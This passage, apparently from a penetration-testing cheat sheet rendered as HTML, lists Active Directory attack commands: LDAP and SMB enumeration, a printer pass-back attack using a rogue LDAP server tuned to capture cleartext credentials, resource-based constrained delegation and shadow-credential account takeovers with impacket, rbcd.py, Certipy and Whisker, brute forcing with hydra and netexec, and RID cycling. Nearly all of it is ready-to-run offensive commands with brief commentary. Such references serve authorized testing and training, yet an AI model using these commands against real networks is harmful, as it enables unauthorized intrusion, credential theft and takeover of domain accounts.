</span><span id="__span-120-5"><a id="__codelineno-120-5" name="__codelineno-120-5" href="#__codelineno-120-5"></a>
</span><span id="__span-120-6"><a id="__codelineno-120-6" name="__codelineno-120-6" href="#__codelineno-120-6"></a># As administrator
</span><span id="__span-120-7"><a id="__codelineno-120-7" name="__codelineno-120-7" href="#__codelineno-120-7"></a># -D: bind DN
</span><span id="__span-120-8"><a id="__codelineno-120-8" name="__codelineno-120-8" href="#__codelineno-120-8"></a># -w: bind password
</span><span id="__span-120-9"><a id="__codelineno-120-9" name="__codelineno-120-9" href="#__codelineno-120-9"></a>ldapsearch -x -H ldap://10.0.0.1 -b &quot;dc=example,dc=com&quot; -D &quot;cn=admin,dc=example,dc=com&quot; -w password
</span><span id="__span-120-10"><a id="__codelineno-120-10" name="__codelineno-120-10" href="#__codelineno-120-10"></a>ldapsearch -x -H ldap://10.0.0.1 -b &quot;dc=example,dc=com&quot; -D &quot;cn=admin,dc=example,dc=com&quot; -W
</span><span id="__span-120-11"><a id="__codelineno-120-11" name="__codelineno-120-11" href="#__codelineno-120-11"></a>
</span><span id="__span-120-12"><a id="__codelineno-120-12" name="__codelineno-120-12" href="#__codelineno-120-12"></a># Search sAMAccountName
</span><span id="__span-120-13"><a id="__codelineno-120-13" name="__codelineno-120-13" href="#__codelineno-120-13"></a>ldapsearch -x -H ldap://10.0.0.1 -b &quot;dc=example,dc=com&quot; -D &quot;workspace\\ldap&quot; -w &#39;password&#39; &quot;(objectclass=*)&quot; &quot;sAMAccountName&quot;
</span><span id="__span-120-14"><a id="__codelineno-120-14" name="__codelineno-120-14" href="#__codelineno-120-14"></a>ldapsearch -x -H ldap://10.0.0.1 -b &quot;dc=example,dc=com&quot; -D &quot;workspace\\ldap&quot; -w &#39;password&#39; &quot;(objectclass=*)&quot; &quot;sAMAccountName&quot; | grep sAMAccountName
</span><span id="__span-120-15"><a id="__codelineno-120-15" name="__codelineno-120-15" href="#__codelineno-120-15"></a>
</span><span id="__span-120-16"><a id="__codelineno-120-16" name="__codelineno-120-16" href="#__codelineno-120-16"></a># Get information
</span><span id="__span-120-17"><a id="__codelineno-120-17" name="__codelineno-120-17" href="#__codelineno-120-17"></a>ldapsearch -x -H ldap://10.0.0.1 -b &quot;cn=sample,cn=Users,dc=example,dc=com&quot; -w &#39;password&#39; &quot;(objectclass=*)&quot; -D &quot;example\\name&quot;
</span></code></pre></div>
<p><br /></p>
<h2 id="dump-active-directory-information">Dump Active Directory Information</h2>
<p>If you have the credential, you can get the Active Directory information via LDAP.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-121-1"><a id="__codelineno-121-1" name="__codelineno-121-1" href="#__codelineno-121-1"></a># --no-html: Disable html output
</span><span id="__span-121-2"><a id="__codelineno-121-2" name="__codelineno-121-2" href="#__codelineno-121-2"></a># --no-grep: Disable greppable output
</span><span id="__span-121-3"><a id="__codelineno-121-3" name="__codelineno-121-3" href="#__codelineno-121-3"></a># -o: Output dir
</span><span id="__span-121-4"><a id="__codelineno-121-4" name="__codelineno-121-4" href="#__codelineno-121-4"></a>ldapdomaindump -u &#39;DOMAIN\username&#39; -p password &lt;target-ip&gt; --no-html --no-grep -o dumped
</span></code></pre></div>
<p><br /></p>
<h2 id="connect">Connect</h2>
<h3 id="ad-cs-active-directory-certificate-services">AD CS (Active Directory Certificate Services)</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-122-1"><a id="__codelineno-122-1" name="__codelineno-122-1" href="#__codelineno-122-1"></a>netexec ldap &lt;target-ip&gt; -d &#39;domain&#39; -u &#39;username&#39; -p &#39;password&#39; -M adcs
</span></code></pre></div>
<h3 id="laps-local-administrator-password-solution">LAPS (Local Administrator Password Solution)</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-123-1"><a id="__codelineno-123-1" name="__codelineno-123-1" href="#__codelineno-123-1"></a>netexec ldap &lt;target-ip&gt; -d &#39;domain&#39; -u &#39;username&#39; -p &#39;password&#39; --kdcHost &lt;target-ip&gt; -M laps
</span></code></pre></div>
<p><br /></p>
<h2 id="pass-back-attack">Pass-Back Attack</h2>
<p>Attack against the network devices such as printers.<br />
For example, access http://printer.sub.example.com/settings.aspx</p>
<p>Open a listener for connecting back to your local machine.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-124-1"><a id="__codelineno-124-1" name="__codelineno-124-1" href="#__codelineno-124-1"></a>nc -vp 1389
</span></code></pre></div>
<p>In your browser, test LDAP settings where you input username and password.</p>
<h3 id="host-rogue-ldap-server">Host Rogue LDAP Server</h3>
<p>If we cannot connect back in local machine by netcat, we need to create a rogue LDAP server.<br />
Install the dependencies at first.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-125-1"><a id="__codelineno-125-1" name="__codelineno-125-1" href="#__codelineno-125-1"></a>sudo apt update
</span><span id="__span-125-2"><a id="__codelineno-125-2" name="__codelineno-125-2" href="#__codelineno-125-2"></a>sudo apt install -y slapd ldap-utils
</span><span id="__span-125-3"><a id="__codelineno-125-3" name="__codelineno-125-3" href="#__codelineno-125-3"></a>sudo systemctl enable slapd
</span></code></pre></div>
<p>Configure your own rogue LDAP server by executing the following command.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-126-1"><a id="__codelineno-126-1" name="__codelineno-126-1" href="#__codelineno-126-1"></a>sudo dpkg-reconfigure -p low slapd
</span><span id="__span-126-2"><a id="__codelineno-126-2" name="__codelineno-126-2" href="#__codelineno-126-2"></a>
</span><span id="__span-126-3"><a id="__codelineno-126-3" name="__codelineno-126-3" href="#__codelineno-126-3"></a># ---------------------------------------------------
</span><span id="__span-126-4"><a id="__codelineno-126-4" name="__codelineno-126-4" href="#__codelineno-126-4"></a>
</span><span id="__span-126-5"><a id="__codelineno-126-5" name="__codelineno-126-5" href="#__codelineno-126-5"></a># in configuration dialog
</span><span id="__span-126-6"><a id="__codelineno-126-6" name="__codelineno-126-6" href="#__codelineno-126-6"></a>
</span><span id="__span-126-7"><a id="__codelineno-126-7" name="__codelineno-126-7" href="#__codelineno-126-7"></a>1. Omit OpenLDAP server configuration: No
</span><span id="__span-126-8"><a id="__codelineno-126-8" name="__codelineno-126-8" href="#__codelineno-126-8"></a>2. DNS domain name: &lt;target-domain&gt;
</span><span id="__span-126-9"><a id="__codelineno-126-9" name="__codelineno-126-9" href="#__codelineno-126-9"></a>3. Organization name: &lt;target-domain&gt;
</span><span id="__span-126-10"><a id="__codelineno-126-10" name="__codelineno-126-10" href="#__codelineno-126-10"></a>4. Administrator password: &lt;arbitrary-password&gt;
</span><span id="__span-126-11"><a id="__codelineno-126-11" name="__codelineno-126-11" href="#__codelineno-126-11"></a>5. Database backend to use: MDB
</span><span id="__span-126-12"><a id="__codelineno-126-12" name="__codelineno-126-12" href="#__codelineno-126-12"></a>6. Do you want the database to be removed when slapd is purged?: No
</span><span id="__span-126-13"><a id="__codelineno-126-13" name="__codelineno-126-13" href="#__codelineno-126-13"></a>7. Move old database?: Yes
</span></code></pre></div>
<p>We need to make your rogue LDAP server to be vulnerable by downgrading the supported authentication mechanism.<br />
Create the config file named "config.ldif".</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-127-1"><a id="__codelineno-127-1" name="__codelineno-127-1" href="#__codelineno-127-1"></a>dn: cn=config
</span><span id="__span-127-2"><a id="__codelineno-127-2" name="__codelineno-127-2" href="#__codelineno-127-2"></a>replace: olcSaslSecProps
</span><span id="__span-127-3"><a id="__codelineno-127-3" name="__codelineno-127-3" href="#__codelineno-127-3"></a>olcSaslSecProps: noanonymous,minssf=0,passcred
</span></code></pre></div>
<p>Now we can use the config file to patch the LDAP server.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-128-1"><a id="__codelineno-128-1" name="__codelineno-128-1" href="#__codelineno-128-1"></a># -Y: SASL mechanism
</span><span id="__span-128-2"><a id="__codelineno-128-2" name="__codelineno-128-2" href="#__codelineno-128-2"></a># -H: URI
</span><span id="__span-128-3"><a id="__codelineno-128-3" name="__codelineno-128-3" href="#__codelineno-128-3"></a>sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./config.ldif
</span><span id="__span-128-4"><a id="__codelineno-128-4" name="__codelineno-128-4" href="#__codelineno-128-4"></a>sudo service slapd restart
</span></code></pre></div>
<p>We can verify that the rogue LDAP server’s configuration has been applied:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-129-1"><a id="__codelineno-129-1" name="__codelineno-129-1" href="#__codelineno-129-1"></a>ldapsearch -H ldap:// -x -LLL -s base -b &quot;&quot; supportedSASLMechanisms
</span></code></pre></div>
<p>For capturing the credentials, run the following command.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-130-1"><a id="__codelineno-130-1" name="__codelineno-130-1" href="#__codelineno-130-1"></a>sudo tcpdump -SX -i &lt;target-interface-like-eth0&gt; tcp port 389
</span></code></pre></div>
<p>In browser, test the printer settings and capture the credentials via tcpdump.</p>
<h1 id="netlogon-elavasion-of-privilege">Netlogon Elavasion of Privilege</h1>
<p>It is a vulnerability to elevate of privilege in Windows Netlogon using the Netlogon Remote Protocol (MS-NRPC). It’s called Zerologon (CVE-2020-1472).</p>
<h2 id="exploitation">Exploitation</h2>
<p>There is a lot of Poc in online.<br />
Here, we’ll use <a href="https://github.com/dirkjanm/CVE-2020-1472">this repository</a> from GitHub.</p>
<h1 id="resource-based-constrained-delegation-attack">Resource-Based Constrained Delegation Attack</h1>
<p>Kerberos RBCD attack targets a domain computer, exactly service principals related to the target domain computer.</p>
<div class="language-text highlight"><pre><span></span><code>- [rbcd-attack](https://github.com/tothi/rbcd-attack)
</code></pre></div>
<h2 id="exploit_2">Exploit</h2>
<p>Reference: <a href="https://github.com/tothi/rbcd-attack#abusing-kerberos-resource-based-constrained-delegation">https://github.com/tothi/rbcd-attack#abusing-kerberos-resource-based-constrained-delegation</a></p>
<h3 id="0-prerequisites">0. Prerequisites</h3>
<p>To achieve this attack successfully, we need the following conditions:</p>
<ul>
<li>A domain account who has permission to write the computer (<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> property of the domain object).</li>
<li>A domain account who has permission to create a new computer.</li>
<li>LDAP (389) and SAMR (445) or LDAPS (636) access to the DC.</li>
<li>Kerberos (88) access to the DC.</li>
</ul>
<h3 id="1-create-fake-computer">1. Create Fake Computer</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-131-1"><a id="__codelineno-131-1" name="__codelineno-131-1" href="#__codelineno-131-1"></a>impacket-addcomputer -computer-name &#39;fakecomputer$&#39; -computer-pass &#39;password&#39; -dc-ip 10.0.0.1 example.local/username:password
</span></code></pre></div>
<h3 id="2-modify-delegation-rights">2. Modify Delegation Rights</h3>
<p>We can use <a href="https://github.com/tothi/rbcd-attack#abusing-kerberos-resource-based-constrained-delegation">rbcd.py</a> for abusing <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> property of the target.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-132-1"><a id="__codelineno-132-1" name="__codelineno-132-1" href="#__codelineno-132-1"></a>rbcd.py -f FAKECOMPUTER -t WEB -dc-ip 10.0.0.1 example\\username:password
</span><span id="__span-132-2"><a id="__codelineno-132-2" name="__codelineno-132-2" href="#__codelineno-132-2"></a>
</span><span id="__span-132-3"><a id="__codelineno-132-3" name="__codelineno-132-3" href="#__codelineno-132-3"></a>rbcd.py &#39;example.local/fakecomputer$&#39; -delegate-to &#39;fakecomputer$&#39; -delegate-from user1 -action write -use-ldaps -k -no-pass
</span></code></pre></div>
<h3 id="3-get-the-impersonated-service-ticket">3. Get the Impersonated Service Ticket</h3>
<p>Impersonated service tickets may allow high-level access to services on the target like CIFS (Common Internet File System), HTTPs, etc.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-133-1"><a id="__codelineno-133-1" name="__codelineno-133-1" href="#__codelineno-133-1"></a>getST.py -spn cifs/example.local -impersonate admin -dc-ip 10.0.0.1 example.local/FAKECOMPUTER$:password
</span></code></pre></div>
<h3 id="4-use-the-service-ticket">4. Use the Service Ticket</h3>
<p>After getting the service ticket, we can use it for further pentesting.<br />
Before doing that, we need to add the environment variable as below:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-134-1"><a id="__codelineno-134-1" name="__codelineno-134-1" href="#__codelineno-134-1"></a>export KRB5CCNAME=`pwd`/admin.ccache
</span><span id="__span-134-2"><a id="__codelineno-134-2" name="__codelineno-134-2" href="#__codelineno-134-2"></a>
</span><span id="__span-134-3"><a id="__codelineno-134-3" name="__codelineno-134-3" href="#__codelineno-134-3"></a># Check by listing tickets.
</span><span id="__span-134-4"><a id="__codelineno-134-4" name="__codelineno-134-4" href="#__codelineno-134-4"></a># If the klist command not found, install it by `apt install krb5-user`
</span><span id="__span-134-5"><a id="__codelineno-134-5" name="__codelineno-134-5" href="#__codelineno-134-5"></a>klist
</span></code></pre></div>
<ul>
<li>Login to Services with Kerberos Auth</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-135-1"><a id="__codelineno-135-1" name="__codelineno-135-1" href="#__codelineno-135-1"></a>    # -k: Use Kerberos Auth
</span><span id="__span-135-2"><a id="__codelineno-135-2" name="__codelineno-135-2" href="#__codelineno-135-2"></a>    # -no-pass: No password
</span><span id="__span-135-3"><a id="__codelineno-135-3" name="__codelineno-135-3" href="#__codelineno-135-3"></a>    impacket-wmiexec example.local/Administrator@example.local -k -no-pass
</span></code></pre></div>
<h1 id="shadow-credentials">Shadow Credentials</h1>
<p>Shadow Credentials is an attack technique to take over Active Directory user/computer account by compromising msDS-KeyCredentialLink property of target objects.</p>
<div class="language-text highlight"><pre><span></span><code>- [kerberos-abuse](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials)
</code></pre></div>
<h2 id="exploit_3">Exploit</h2>
<p>If the attacker can modify the target object's (user or computer account) attribute <code>msDS-KeyCredentialLink</code> and append it with alternate credentials in the form of certificates, he takes over the account in AD.</p>
<h3 id="using-certipy">Using Certipy</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-136-1"><a id="__codelineno-136-1" name="__codelineno-136-1" href="#__codelineno-136-1"></a># -k: Use Kerberos authentication
</span><span id="__span-136-2"><a id="__codelineno-136-2" name="__codelineno-136-2" href="#__codelineno-136-2"></a>certipy shadow auto -account &quot;targetuser&quot; -u &quot;username@example.local&quot; -p &#39;password&#39; -dc-ip 10.0.0.1 -target dc.example.local -k
</span></code></pre></div>
<h3 id="using-whisker">Using Whisker</h3>
<p><a href="https://github.com/eladshamir/Whisker">Whisker</a> is a C# tool for taking over Active Directory user and computer accounts by manipulating their msDS-KeyCredentialLink attribute.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-137-1"><a id="__codelineno-137-1" name="__codelineno-137-1" href="#__codelineno-137-1"></a>Whisker.exe add /target:john /domain:example.local
</span></code></pre></div>
<h1 id="smb-server-message-block-pentesting">SMB (Server Message Block) Pentesting</h1>
<p>It allows clients, like workstations, to communicate with a server like a share directory. Samba is derived from SMB for linux. Default ports are 139, 445.</p>
<h2 id="enumeration_5">Enumeration</h2>
<p>To enumerate automatically, we can use various tools such as <code>nmap</code>, <code>smbclient</code>, and so on</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-138-1"><a id="__codelineno-138-1" name="__codelineno-138-1" href="#__codelineno-138-1"></a>nmap --script smb-brute -p 445 &lt;target-ip&gt;
</span><span id="__span-138-2"><a id="__codelineno-138-2" name="__codelineno-138-2" href="#__codelineno-138-2"></a>nmap --script smb-enum-shares.nse,smb-enum-users.nse -p 445 &lt;target-ip&gt;
</span><span id="__span-138-3"><a id="__codelineno-138-3" name="__codelineno-138-3" href="#__codelineno-138-3"></a>nmap --script smb-enum* -p 445 &lt;target-ip&gt;
</span><span id="__span-138-4"><a id="__codelineno-138-4" name="__codelineno-138-4" href="#__codelineno-138-4"></a>nmap --script smb-protocols -p 445 &lt;target-ip&gt;
</span><span id="__span-138-5"><a id="__codelineno-138-5" name="__codelineno-138-5" href="#__codelineno-138-5"></a>nmap --script smb-vuln* -p 445 &lt;target-ip&gt;
</span><span id="__span-138-6"><a id="__codelineno-138-6" name="__codelineno-138-6" href="#__codelineno-138-6"></a>
</span><span id="__span-138-7"><a id="__codelineno-138-7" name="__codelineno-138-7" href="#__codelineno-138-7"></a># NetBIOS names
</span><span id="__span-138-8"><a id="__codelineno-138-8" name="__codelineno-138-8" href="#__codelineno-138-8"></a>nmblookup -A 10.0.0.1
</span><span id="__span-138-9"><a id="__codelineno-138-9" name="__codelineno-138-9" href="#__codelineno-138-9"></a>nbtscan 10.0.0.1
</span><span id="__span-138-10"><a id="__codelineno-138-10" name="__codelineno-138-10" href="#__codelineno-138-10"></a>nbtscan -r 10.0.0.1/24
</span><span id="__span-138-11"><a id="__codelineno-138-11" name="__codelineno-138-11" href="#__codelineno-138-11"></a>
</span><span id="__span-138-12"><a id="__codelineno-138-12" name="__codelineno-138-12" href="#__codelineno-138-12"></a># Enum4linux
</span><span id="__span-138-13"><a id="__codelineno-138-13" name="__codelineno-138-13" href="#__codelineno-138-13"></a>enum4linux &lt;target-ip&gt;
</span><span id="__span-138-14"><a id="__codelineno-138-14" name="__codelineno-138-14" href="#__codelineno-138-14"></a># All enumeration
</span><span id="__span-138-15"><a id="__codelineno-138-15" name="__codelineno-138-15" href="#__codelineno-138-15"></a>enum4linux -a &lt;target-ip&gt;
</span><span id="__span-138-16"><a id="__codelineno-138-16" name="__codelineno-138-16" href="#__codelineno-138-16"></a># Verbose
</span><span id="__span-138-17"><a id="__codelineno-138-17" name="__codelineno-138-17" href="#__codelineno-138-17"></a>enum4linux -v &lt;target-ip&gt;
</span><span id="__span-138-18"><a id="__codelineno-138-18" name="__codelineno-138-18" href="#__codelineno-138-18"></a># Specify username and password
</span><span id="__span-138-19"><a id="__codelineno-138-19" name="__codelineno-138-19" href="#__codelineno-138-19"></a>enum4linux -u username -p password &lt;target-ip&gt;
</span><span id="__span-138-20"><a id="__codelineno-138-20" name="__codelineno-138-20" href="#__codelineno-138-20"></a>
</span><span id="__span-138-21"><a id="__codelineno-138-21" name="__codelineno-138-21" href="#__codelineno-138-21"></a># Enum4linux-ng
</span><span id="__span-138-22"><a id="__codelineno-138-22" name="__codelineno-138-22" href="#__codelineno-138-22"></a># -A: All simple enumeration including nmblookup
</span><span id="__span-138-23"><a id="__codelineno-138-23" name="__codelineno-138-23" href="#__codelineno-138-23"></a>enum4linux-ng -A &lt;target-ip&gt;
</span><span id="__span-138-24"><a id="__codelineno-138-24" name="__codelineno-138-24" href="#__codelineno-138-24"></a># -As: All simple short enumeration without NetBIOS names lookup
</span><span id="__span-138-25"><a id="__codelineno-138-25" name="__codelineno-138-25" href="#__codelineno-138-25"></a>enum4linux-ng -As &lt;target-ip&gt;
</span><span id="__span-138-26"><a id="__codelineno-138-26" name="__codelineno-138-26" href="#__codelineno-138-26"></a># -u: Specific username
</span><span id="__span-138-27"><a id="__codelineno-138-27" name="__codelineno-138-27" href="#__codelineno-138-27"></a># -p: Specific password
</span><span id="__span-138-28"><a id="__codelineno-138-28" name="__codelineno-138-28" href="#__codelineno-138-28"></a>enum4linux-ng -u &quot;administrator&quot; -p &quot;password&quot; &lt;target-ip&gt;
</span><span id="__span-138-29"><a id="__codelineno-138-29" name="__codelineno-138-29" href="#__codelineno-138-29"></a>
</span><span id="__span-138-30"><a id="__codelineno-138-30" name="__codelineno-138-30" href="#__codelineno-138-30"></a># NetExec (https://www.netexec.wiki/)
</span><span id="__span-138-31"><a id="__codelineno-138-31" name="__codelineno-138-31" href="#__codelineno-138-31"></a>netexec smb 10.0.0.0/24
</span><span id="__span-138-32"><a id="__codelineno-138-32" name="__codelineno-138-32" href="#__codelineno-138-32"></a>netexec smb &lt;target-ip&gt;
</span><span id="__span-138-33"><a id="__codelineno-138-33" name="__codelineno-138-33" href="#__codelineno-138-33"></a>netexec smb &lt;target-ip-1&gt; &lt;target-ip-2&gt;
</span><span id="__span-138-34"><a id="__codelineno-138-34" name="__codelineno-138-34" href="#__codelineno-138-34"></a>netexec smb &lt;target-ip&gt; -u username -p password
</span><span id="__span-138-35"><a id="__codelineno-138-35" name="__codelineno-138-35" href="#__codelineno-138-35"></a>netexec smb &lt;target-ip&gt; -u username -p password --users
</span><span id="__span-138-36"><a id="__codelineno-138-36" name="__codelineno-138-36" href="#__codelineno-138-36"></a># -M zerologon: Scan for ZeroLogon
</span><span id="__span-138-37"><a id="__codelineno-138-37" name="__codelineno-138-37" href="#__codelineno-138-37"></a># -M petitpotam: Scan for PetitPotam
</span><span id="__span-138-38"><a id="__codelineno-138-38" name="__codelineno-138-38" href="#__codelineno-138-38"></a>netexec smb &lt;target-ip&gt; -u &#39;&#39; -p &#39;&#39; -M zerologon -M petitpotam
</span><span id="__span-138-39"><a id="__codelineno-138-39" name="__codelineno-138-39" href="#__codelineno-138-39"></a># -M petitpotam: Scan for PetitPotam
</span></code></pre></div>
<h3 id="find-shared-folders">Find Shared Folders</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-139-1"><a id="__codelineno-139-1" name="__codelineno-139-1" href="#__codelineno-139-1"></a># -N: No password
</span><span id="__span-139-2"><a id="__codelineno-139-2" name="__codelineno-139-2" href="#__codelineno-139-2"></a># -L: List shared directories
</span><span id="__span-139-3"><a id="__codelineno-139-3" name="__codelineno-139-3" href="#__codelineno-139-3"></a>smbclient -N -L &lt;target-ip&gt;
</span><span id="__span-139-4"><a id="__codelineno-139-4" name="__codelineno-139-4" href="#__codelineno-139-4"></a>smbclient -L &lt;target-ip&gt; -U username
</span><span id="__span-139-5"><a id="__codelineno-139-5" name="__codelineno-139-5" href="#__codelineno-139-5"></a>
</span><span id="__span-139-6"><a id="__codelineno-139-6" name="__codelineno-139-6" href="#__codelineno-139-6"></a>smbmap -H &lt;target-ip&gt;
</span><span id="__span-139-7"><a id="__codelineno-139-7" name="__codelineno-139-7" href="#__codelineno-139-7"></a># Recursive
</span><span id="__span-139-8"><a id="__codelineno-139-8" name="__codelineno-139-8" href="#__codelineno-139-8"></a>smbmap -H &lt;target-ip&gt; -R
</span><span id="__span-139-9"><a id="__codelineno-139-9" name="__codelineno-139-9" href="#__codelineno-139-9"></a># Username and password
</span><span id="__span-139-10"><a id="__codelineno-139-10" name="__codelineno-139-10" href="#__codelineno-139-10"></a>smbmap -u username -p password -H &lt;target-ip&gt;
</span><span id="__span-139-11"><a id="__codelineno-139-11" name="__codelineno-139-11" href="#__codelineno-139-11"></a># Execute a command
</span><span id="__span-139-12"><a id="__codelineno-139-12" name="__codelineno-139-12" href="#__codelineno-139-12"></a>smbmap -u username -p password -H &lt;target-ip&gt; -x &#39;ipconfig&#39;
</span><span id="__span-139-13"><a id="__codelineno-139-13" name="__codelineno-139-13" href="#__codelineno-139-13"></a>
</span><span id="__span-139-14"><a id="__codelineno-139-14" name="__codelineno-139-14" href="#__codelineno-139-14"></a>netexec smb &lt;target-ip&gt; -u &#39;&#39; -p &#39;&#39; --shares
</span><span id="__span-139-15"><a id="__codelineno-139-15" name="__codelineno-139-15" href="#__codelineno-139-15"></a>netexec smb &lt;target-ip&gt; -u username -p password --shares
</span><span id="__span-139-16"><a id="__codelineno-139-16" name="__codelineno-139-16" href="#__codelineno-139-16"></a>
</span><span id="__span-139-17"><a id="__codelineno-139-17" name="__codelineno-139-17" href="#__codelineno-139-17"></a>impacket-psexec example.local/username@&lt;target-ip&gt;
</span></code></pre></div>
<h3 id="brute-force-credentials">Brute Force Credentials</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-140-1"><a id="__codelineno-140-1" name="__codelineno-140-1" href="#__codelineno-140-1"></a>netexec smb &lt;target-ip&gt; -u username -p passwords.txt --continue-on-success
</span><span id="__span-140-2"><a id="__codelineno-140-2" name="__codelineno-140-2" href="#__codelineno-140-2"></a>netexec smb &lt;target-ip&gt; -u usernames.txt -H ntlm_hashes.txt --continue-on-success
</span><span id="__span-140-3"><a id="__codelineno-140-3" name="__codelineno-140-3" href="#__codelineno-140-3"></a>
</span><span id="__span-140-4"><a id="__codelineno-140-4" name="__codelineno-140-4" href="#__codelineno-140-4"></a>hydra -l username -P passwords.txt &lt;target-ip&gt; smb
</span><span id="__span-140-5"><a id="__codelineno-140-5" name="__codelineno-140-5" href="#__codelineno-140-5"></a>hydra -L usernames.txt -p password &lt;target-ip&gt; smb
</span><span id="__span-140-6"><a id="__codelineno-140-6" name="__codelineno-140-6" href="#__codelineno-140-6"></a>
</span><span id="__span-140-7"><a id="__codelineno-140-7" name="__codelineno-140-7" href="#__codelineno-140-7"></a># RID Brute Force
</span><span id="__span-140-8"><a id="__codelineno-140-8" name="__codelineno-140-8" href="#__codelineno-140-8"></a>netexec smb &lt;target-ip&gt; -u username -p password --rid-brute 20000
</span><span id="__span-140-9"><a id="__codelineno-140-9" name="__codelineno-140-9" href="#__codelineno-140-9"></a>
</span><span id="__span-140-10"><a id="__codelineno-140-10" name="__codelineno-140-10" href="#__codelineno-140-10"></a># Using Metasploit
</span><span id="__span-140-11"><a id="__codelineno-140-11" name="__codelineno-140-11" href="#__codelineno-140-11"></a>msfconsole
</span><span id="__span-140-12"><a id="__codelineno-140-12" name="__codelineno-140-12" href="#__codelineno-140-12"></a>msf&gt; use auxiliary/scanner/smb/smb_login
</span></code></pre></div>
<p>If we find credentials, we can use them for <strong>smbclient</strong> or <strong>WinRM</strong>.<br />
If we got <strong>"STATUS_PASSWORD_MUST_CHANGE"</strong> for some users, we can update a current password to a new one.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-141-1"><a id="__codelineno-141-1" name="__codelineno-141-1" href="#__codelineno-141-1"></a>smbpasswd -r &lt;target-ip&gt; -U &lt;username&gt;
</span><span id="__span-141-2"><a id="__codelineno-141-2" name="__codelineno-141-2" href="#__codelineno-141-2"></a># or
</span><span id="__span-141-3"><a id="__codelineno-141-3" name="__codelineno-141-3" href="#__codelineno-141-3"></a>impacket-smbpasswd &lt;DOMAIN&gt;/&lt;username&gt;:&lt;password&gt;@&lt;target-ip&gt; -newpass &lt;new-password&gt;
</span><span id="__span-141-4"><a id="__codelineno-141-4" name="__codelineno-141-4" href="#__codelineno-141-4"></a># If you don&#39;t have impacket-smbpasswd, download it from a repository.
</span><span id="__span-141-5"><a id="__codelineno-141-5" name="__codelineno-141-5" href="#__codelineno-141-5"></a>wget https://raw.githubusercontent.com/fortra/impacket/master/examples/smbpasswd.py
</span></code></pre></div>
<p><br /></p>
<h2 id="rid-cycling-attack">RID Cycling Attack</h2>
<p>RID enumeration.<br />
It attempts to enumerate user accounts through null sessions.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-142-1"><a id="__codelineno-142-1" name="__codelineno-142-1" href="#__codelineno-142-1"></a># Anonymous logon
</span><span id="__span-142-2"><a id="__codelineno-142-2" name="__codelineno-142-2" href="#__codelineno-142-2"></a># 20000: Maximum RID to be cycled
</span><span id="__span-142-3"><a id="__codelineno-142-3" name="__codelineno-142-3" href="#__codelineno-142-3"></a>impacket-lookupsid example.local/anonymous@&lt;target-ip&gt; 20000 -no-pass
</span><span id="__span-142-4"><a id="__codelineno-142-4" name="__codelineno-142-4" href="#__codelineno-142-4"></a>impacket-lookupsid example.local/guest@&lt;target-ip&gt; 20000 -no-pass
</span><span id="__span-142-5"><a id="__codelineno-142-5" name="__codelineno-142-5" href="#__codelineno-142-5"></a>impacket-lookupsid example.local/guest@&lt;target-ip&gt; 20000
</span><span id="__span-142-6"><a id="__codelineno-142-6" name="__codelineno-142-6" href="#__codelineno-142-6"></a># Specify user
</span><span id="__span-142-7"><a id="__codelineno-142-7" name="__codelineno-142-7" href="#__codelineno-142-7"></a>impacket-lookupsid example.local/user@&lt;target-ip&gt; 20000 -hashes &lt;lmhash&gt;:&lt;nthash&gt;
</span><span id="__span-142-8"><a id="__codelineno-142-8" name="__codelineno-142-8" href="#__codelineno-142-8"></a>impacket-lookupsid example.local/user@&lt;target-ip&gt; 20000
</span><span id="__span-142-9"><a id="__codelineno-142-9" name="__codelineno-142-9" href="#__codelineno-142-9"></a>
</span><span id="__span-142-10"><a id="__codelineno-142-10" name="__codelineno-142-10" href="#__codelineno-142-10"></a>
</span><span id="__span-142-11"><a id="__codelineno-142-11" name="__codelineno-142-11" href="#__codelineno-142-11"></a># USEFUL COMMAND
</span><span id="__span-142-12"><a id="__codelineno-142-12" name="__codelineno-142-12" href="#__codelineno-142-12"></a># This command extract usernames. It&#39;s useful for further enumeration which uses usernames.
</span><span id="__span-142-13"><a id="__codelineno-142-13" name="__codelineno-142-13" href="#__codelineno-142-13"></a># Replace the following keywords:
</span><span id="__span-142-14"><a id="__codelineno-142-14" name="__codelineno-142-14" href="#__codelineno-142-14"></a>#  - `example.com` =&gt; Target domain
</span><span id="__span-142-15"><a id="__codelineno-142-15" name="__codelineno-142-15" href="#__codelineno-142-15"></a>#  - `10.0.0.1`    =&gt; Target IP
</span><span id="__span-142-16"><a id="__codelineno-142-16" name="__codelineno-142-16" href="#__codelineno-142-16"></a>#  - `DOMAIN`      =&gt; Target domain name
</span><span id="__span-142-17"><a id="__codelineno-142-17" name="__codelineno-142-17" href="#__codelineno-142-17"></a>impacket-lookupsid example.com/guest@10.0.0.1 20000 -no-pass &gt; tmp.txt | cat tmp.txt | grep SidTypeUser | cut -d &#39; &#39; -f 2 | sed &#39;s/DOMAIN\\//g&#39; | sort -u &gt; users.txt &amp;&amp; rm tmp.txt
</span></code></pre></div>
<p><br /></p>
<h2 id="password-spraying-attack">Password Spraying Attack</h2>
<p>If we have a user password, we might be able to find another user with the same password.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-143-1"><a id="__codelineno-143-1" name="__codelineno-143-1" href="#__codelineno-143-1"></a># User enumeration
